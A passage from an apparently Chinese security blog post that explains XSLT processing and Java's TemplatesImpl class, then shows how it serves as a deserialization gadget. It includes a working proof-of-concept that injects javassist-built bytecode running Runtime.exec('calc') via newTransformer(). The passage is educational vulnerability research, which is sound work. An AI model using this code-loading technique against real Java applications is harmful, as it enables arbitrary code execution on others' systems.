class="string">"yes"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My CD Collection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span> <span class="attr">style</span>=<span class="string">"text-align:left"</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span> <span class="attr">style</span>=<span class="string">"text-align:left"</span>&gt;</span>Artist<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"catalog/cd"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"title"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"artist"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转换结果如下，读取xml的元素并展示为html格式：</p><table><thead><tr><th>Title</th><th>Artist</th></tr></thead><tbody><tr><td>Empire Burlesque</td><td>Bob Dylan</td></tr><tr><td>Hide your heart</td><td>Bonnie Tyler</td></tr></tbody></table><h3 id="2、javax-xml-transform-Templates"><a href="#2、javax-xml-transform-Templates" class="headerlink" title="2、javax.xml.transform.Templates"></a>2、javax.xml.transform.Templates</h3><p>TemplatesImpl实现了<code>javax.xml.transform.Templates</code>接口，<code>javax.xml.transform</code>属于JAXP（Java API for XMLProcessing，提供解析和验证XML文档的能力），是一个处理XSL转换（XSLT）的包，定义了用于处理转换指令以及执行从源到结果的转换的API。<code>javax.xml.transform.Templates</code>是用来处理XSLT模板的，它只定义了两个方法：</p><table><thead><tr><th>Modifier and Type</th><th>Method and Description</th></tr></thead><tbody><tr><td><code>Properties</code></td><td><code>getOutputProperties()</code>  获取xsl:output元素相对应的属性。</td></tr><tr><td><code>Transformer</code></td><td><code>newTransformer()</code>  为此Templates对象创建一个新的转换上下文。</td></tr></tbody></table><h3 id="3、XSLTC和Translets"><a href="#3、XSLTC和Translets" class="headerlink" title="3、XSLTC和Translets"></a>3、XSLTC和Translets</h3><p>TemplatesImpl在<code>com.sun.org.apache.xalan.internal.xsltc</code>包下，xalan是Apache的一个项目，是XSLT处理器。</p><p>XSLTC指xslt compiler或xslt compiling，可以把XSLT文件编译成一个或者多个Java的class文件，通过这种方式可以加速xsl的转换速度。这些class或者class的集合被称为Translets，他们被转换时自动会继承AbstractTranslet。</p><p>利用Xalan命令行工具（注意使用jdk1.8以前版本）将XSLT文件转为class：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java com.sun.org.apache.xalan.internal.xsltc.cmdline.Compile cdcatalog.xsl</span><br></pre></td></tr></table></figure><p>执行命令后会在文件夹下生成一个class文件：</p><p><img src="/imgs/image-20210709173211394.png" alt="image-20210709173211394"></p><h3 id="4、TemplatesImpl类解读"><a href="#4、TemplatesImpl类解读" class="headerlink" title="4、TemplatesImpl类解读"></a>4、TemplatesImpl类解读</h3><p>TemplatesImpl主要是通过获取Translet的Class或字节码来创建 XSLTC 模板对象。根据上面第3点的学习这里不难理解，XSLTC生成的Translets，需要转为模板对象，可以用TemplatesImpl定义和处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span></span></span><br></pre></td></tr></table></figure><h4 id="4-1、静态内部类TransletClassLoader："><a href="#4-1、静态内部类TransletClassLoader：" class="headerlink" title="4.1、静态内部类TransletClassLoader："></a>4.1、静态内部类TransletClassLoader：</h4><p>TemplatesImpl通过获取Translet的Class或字节码来创建 XSLTC 模板对象，需要在运行时加载class，因此其在内部自定义了一个静态类TransletClassLoader用来加载Translet的Class对象，并且重载了loadClass和defineClass方法。</p><p>我们知道ClassLoader的loadClass通过一个类名全称返回一个Class类的实例；<br>而defineClass通过接收一组字节，然后将其具体化为一个Class类的实例，它一般从磁盘上加载一个文件，然后将文件的字节码传递给JVM，通过JVM（native 方法）对于Class的定义将其实例化为一个Class类的实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 当SecurityManager未设置且FSP关闭时，_loaddexternalextensionfunctions将为空</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 调用super.loadClass，通过类全称获取Class类实例</span></span><br><span class="line">            ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从外部类访问protected修饰的父类方法。</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 调用super.defineClass，通过字节码来获取Class类实例</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2、属性说明："><a href="#4-2、属性说明：" class="headerlink" title="4.2、属性说明："></a>4.2、属性说明：</h4><table><thead><tr><th>修饰及类型</th><th>属性名、属性值及说明</th></tr></thead><tbody><tr><td>public final static String</td><td>DESERIALIZE_TRANSLET = “jdk.xml.enableTemplatesImplDeserialization”;</td></tr><tr><td>private static String</td><td>ABSTRACT_TRANSLET = “com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”;<br/>所有translets的超类名。这里的Translet类都需要继承AbstractTranslet</td></tr><tr><td>private String</td><td>_name = null;<br/>主类的名称或默认名称(如果未知)</td></tr><tr><td>private byte[][]</td><td>_bytecodes = null<br/>包含Translet类和任何辅助类的实际类定义的字节码</td></tr><tr><td>private Class[]</td><td>_class = null<br/>包含Translet类定义。这些是在创建模板或从磁盘读取模板时创建的</td></tr><tr><td>private int</td><td>_transletIndex = -1<br/>主Translet类在数组_class[]和_bytecodes中的索引</td></tr><tr><td>private transient Map&lt;String, Class&lt;?&gt;&gt;</td><td>_auxClasses = null<br/>包含辅助类定义的列表</td></tr><tr><td>private Properties</td><td>_outputProperties<br/>translet的output属性</td></tr><tr><td>private int</td><td>_indentNumber<br/>要为输出缩进添加的空格数</td></tr><tr><td>private transient URIResolver</td><td>_uriResolver = null<br/>URIResolver被传递给所有的transformer</td></tr><tr><td>private transient</td><td>ThreadLocal _sdom = new ThreadLocal();</td></tr><tr><td>private transient</td><td>TransformerFactoryImpl _tfactory = null<br/>该模板对象所属的TransformerFactory的引用</td></tr><tr><td>private transient boolean</td><td>_overrideDefaultParser<br/>确定系统默认解析器是否可以被重写的标志</td></tr><tr><td>private transient String</td><td>_accessExternalStylesheet = XalanConstants.EXTERNAL_ACCESS_DEFAULT<br/>协议允许样式表处理指令、Import和Include元素设置外部引用</td></tr></tbody></table><h4 id="4-3、构造方法解析："><a href="#4-3、构造方法解析：" class="headerlink" title="4.3、构造方法解析："></a>4.3、构造方法解析：</h4><p>TemplatesImpl提供了两个有参构造方法都是protected，如果TemplatesImpl要实例化，需要通过内部方法进行调用。</p><p>构造方法1：通过字节码创建template对象，必须提供translet和辅助类的字节码，以及主translet类的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TemplatesImpl</span><span class="params">(<span class="keyword">byte</span>[][] bytecodes, String transletName, Properties outputProperties, <span class="keyword">int</span> indentNumber, TransformerFactoryImpl tfactory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _bytecodes = bytecodes;</span><br><span class="line">    init(transletName, outputProperties, indentNumber, tfactory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造方法2：通过translet类创建XSLTC模板对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TemplatesImpl</span><span class="params">(Class[] transletClasses, String transletName, Properties outputProperties, <span class="keyword">int</span> indentNumber, TransformerFactoryImpl tfactory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _class     = transletClasses;</span><br><span class="line">    _transletIndex = <span class="number">0</span>;</span><br><span class="line">    init(transletName, outputProperties, indentNumber, tfactory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-4、Templates接口方法实现："><a href="#4-4、Templates接口方法实现：" class="headerlink" title="4.4、Templates接口方法实现："></a>4.4、Templates接口方法实现：</h4><p>首先是Templates接口的两个方法：newTransformer和getOutputProperties，newTransformer会调用TransformerImpl有参构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现JAXP's Templates.newTransformer()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用TransformerImpl构造函数创建一个TransformerImpl实例</span></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了JAXP的Templates.getOutputProperties()。需要实例化一个translet以获得输出属性，因此我们可以实例化一个Transformer来调用它。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5、方法说明："><a href="#4-5、方法说明：" class="headerlink" title="4.5、方法说明："></a>4.5、方法说明：</h4><table><thead><tr><th>修饰</th><th>方法</th></tr></thead><tbody><tr><td>private  void</td><td>defineTransletClasses()：定义Translet类和辅助类。</td></tr><tr><td>java.util.Properties</td><td>getOutputProperties()：实现了JAXP的Templates.getOutputProperties()。</td></tr><tr><td>DOM</td><td>getStylesheetDOM()：返回样式表DOM的线程本地副本。</td></tr><tr><td>byte[][]</td><td>getTransletBytecodes()： 返回Translet字节码</td></tr><tr><td>java.lang.Class[]</td><td>getTransletClasses()：返回Translet字节码</td></tr><tr><td>int</td><td>getTransletIndex()： 返回主类在字节码数组中的索引</td></tr><tr><td>private  Translet</td><td>getTransletInstance()：生成Translet类的实例。</td></tr><tr><td>protected  java.lang.String</td><td>getTransletName()：返回Translet主类的名称</td></tr><tr><td>javax.xml.transform.Transformer</td><td>newTransformer()：实现了JAXP的Templates.newTransformer ()</td></tr><tr><td>private  void</td><td>readObject(java.io.ObjectInputStream is)：重写readObject</td></tr><tr><td>void</td><td>setStylesheetDOM(DOM sdom)：设置样式表DOM的线程本地副本</td></tr><tr><td>protected  void</td><td>setTransletBytecodes(byte[][] bytecodes)：获取TransformerFactory设置的Translet字节码并创建Translet实例。</td></tr><tr><td>protected  void</td><td>setTransletName(java.lang.String name)：TransformerFactory调用此方法来设置Translet名称</td></tr><tr><td>void</td><td>setURIResolver(javax.xml.transform.URIResolver resolver)：设置Transformer所需的URIResolver。</td></tr><tr><td>private  void</td><td>writeObject(java.io.ObjectOutputStream os)：实现了URIResolver和Serializable的类将被序列化</td></tr></tbody></table><h3 id="5、XML-XSLT-HTML在Java中的转换实例"><a href="#5、XML-XSLT-HTML在Java中的转换实例" class="headerlink" title="5、XML-XSLT-HTML在Java中的转换实例"></a>5、XML-XSLT-HTML在Java中的转换实例</h3><p>接下来我们看一个XML-XSLT-HTML的常规转换例子，通过这个例子我们可以知道转换在Java中实现的步骤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.transform.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTmp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerException, FileNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> TestTmp().testTransform();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTransform</span><span class="params">()</span> <span class="keyword">throws</span> TransformerException, FileNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">/*---- 1、使用TransformFactory的newInstance方法创建一个新的实例。-------------------*/</span></span><br><span class="line">        <span class="comment">// TransformFactory的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl类</span></span><br><span class="line">        TransformerFactory oFactory = TransformerFactory.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*---- 2、使用TransformFactory的newTemplates方法创建一个Templates界面的实现对象。-------------------*/</span></span><br><span class="line">        <span class="comment">//Templates的缺省实现 是org.apache.xalan.templates.StylesheetRoot</span></span><br><span class="line">        Templates oTemplates = oFactory.newTemplates(</span><br><span class="line">                <span class="comment">//使用一个StreamSource对象来读取一个xsl文档</span></span><br><span class="line">                <span class="keyword">new</span> javax.xml.transform.stream.StreamSource(<span class="string">"cdcatalog.xsl"</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*---- 3、使用Templates的newTransformer方法创建一个新的Transformer。 -------------------*/</span></span><br><span class="line">        <span class="comment">//Transformer的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span></span><br><span class="line">        Transformer transformer = oTemplates.newTransformer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*---- 4、使用Transformer进行转换。  -------------------*/</span></span><br><span class="line">        transformer.transform(</span><br><span class="line">                <span class="comment">//创建一个StreamSource对象来读取atom.xml</span></span><br><span class="line">                <span class="keyword">new</span> javax.xml.transform.stream.StreamSource(<span class="string">"cdcatalog.xml"</span>),</span><br><span class="line">                <span class="comment">//使用out作为输出writer创建一个StreamResult输出转换结果。</span></span><br><span class="line">                <span class="keyword">new</span> javax.xml.transform.stream.StreamResult(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.html"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行上面代码最终会在文件夹下生成一个1.html文件，1.html跟上述第一部分的示例转换结果一致。</p><p>通过上面代码，我们可以总结出一个XML-XSLT-HTML的转换在Java中一般有以下4个步骤：</p><ol><li>创建一个TransformFactory对象；</li><li>调用TransformFactory.newTemplates通过XSL样式表创建一个Templates对象；</li><li>调用Templates.newTransformer创建一个Transformer对象；</li><li>最后通过Transformer.transform将源-XML文档转换为目标-HTML文档。</li></ol><p>其中需要注意的是以上接口的<strong>缺省实现</strong>都是Xalan提供的com.sun.org.apache.xalan库内对应的实现类来创建对象。</p><p>TransformFactory.newTemplates通过XSL样式表创建一个Templates对象，其实现主要由三个部分：</p><ol><li>如果_useClasspath属性为true，则尝试从CLASSPATH加载文件，并使用XSL样式表文件加载后的Class创建模板对象：调用new TemplatesImpl(new Class[]{clazz}, transletName, null, _indentNumber, this)；</li><li>如果_autoTranslet为true，将尝试在不编译样式表的情况下从translet类加载字节码来创建对象；</li><li>以上两种条件不满足，直接创建并初始化样式表编译器来编译样式表，生成字节码，通过字节码创建模板对象。</li></ol><h2 id="二、TemplatesImpl被反序列化漏洞利用的特性"><a href="#二、TemplatesImpl被反序列化漏洞利用的特性" class="headerlink" title="二、TemplatesImpl被反序列化漏洞利用的特性"></a>二、TemplatesImpl被反序列化漏洞利用的特性</h2><p>清楚了TemplatesImpl的方法和使用方式，接下来这部分我们探索下它跟反序列化漏洞的关系。</p><h3 id="1、JDK7u21的TemplatesImpl利用测试"><a href="#1、JDK7u21的TemplatesImpl利用测试" class="headerlink" title="1、JDK7u21的TemplatesImpl利用测试"></a>1、JDK7u21的TemplatesImpl利用测试</h3><p>我们将<a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl" target="_blank" rel="noopener">JDK7u21分析poc</a>的<code>return templates;</code>改为<code>templates.newTransformer()</code>进行测试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTemplate</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1、通过javassist创建一个Evil类的字节码，设置它的构造方法内部调用exec方法</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">    CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">    cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">    CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">    cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">    cc.addConstructor(cons);</span><br><span class="line">    <span class="keyword">byte</span>[] byteCode = cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">    <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">    <span class="comment">// 2、创建一个TemplatesImpl对象，设置属性_bytecodes值为Evil类的字节码</span></span><br><span class="line">    TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">    setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCode);<span class="comment">//设置_bytecodes是属性</span></span><br><span class="line">    setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"xx"</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">// 3、调用newTransformer()</span></span><br><span class="line">    templates.newTransformer();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用上述testTemplate方法，最终会弹出计算器：</p><p><img src="/imgs/image-20210711222056062.png" alt="image-20210711222056062"></p><p>为什么能够执行<code>Runtime.getRuntime().exec(\&quot;calc\&quot;)</code>，关键点在于第3步<code>templates.newTransformer();</code>，接下来重点分析下。</p><h3 id="2、newTransformer-分析："><a href="#2、newTransformer-分析：" class="headerlink" title="2、newTransformer()分析："></a>2、<code>newTransformer()</code>分析：</h3><h4 id="2-1、newTransformer"><a href="#2-1、newTransformer" class="headerlink" title="2.1、newTransformer"></a>2.1、newTransformer</h4><p>根据4.4我们知道newTransformer()会调用TransformerImpl构造函数创建实例：<code>new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory)</code>，getTransletInstance()会返回Translet类的实例；</p><h4 id="2-2、getTransletInstance"><a href="#2-2、getTransletInstance" class="headerlink" title="2.2、getTransletInstance"></a>2.2、getTransletInstance</h4><p>getTransletInstance在一开始时对_name和_class实现进行了判断，当_name不为null而_class是null就会调用defineTransletClasses来获取Translet的Class对象，接着会调用newInstance实例化Translet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果_name属性为null返回Translet是null</span></span><br><span class="line"><span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// 如果_class属性是null调用defineTransletClasses</span></span><br><span class="line"><span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"><span class="comment">// 当属性_class被赋值，即要转换的样式表class文件translet类存在，通过translet类来实例化</span></span><br><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">translet.postInitialization();</span><br><span class="line">translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line"><span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// translet需要保留对所有辅助类的引用，以防止GC收集它们</span></span><br><span class="line">    translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> translet;</span><br></pre></td></tr></table></figure><h4 id="2-3、defineTransletClasses："><a href="#2-3、defineTransletClasses：" class="headerlink" title="2.3、defineTransletClasses："></a>2.3、defineTransletClasses：</h4><p>defineTransletClasses用来定义translet类和辅助类，会创建一个内部类TransletClassLoader的对象，通过该对象调用defineClass，根据之前4.1的分析我们知道defineClass会调用Java虚拟机的native方法生成一个Translet类的Class对象。所以到这里我们最终能够获取到Evil字节码生成的Class对象，再经过2.2<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance()</code>对Evil类进行实例化，最终能够执行命令弹出计算器。以下是defineTransletClasses的关键代码摘取：</p><figure class="highlight java"><table><tr><td 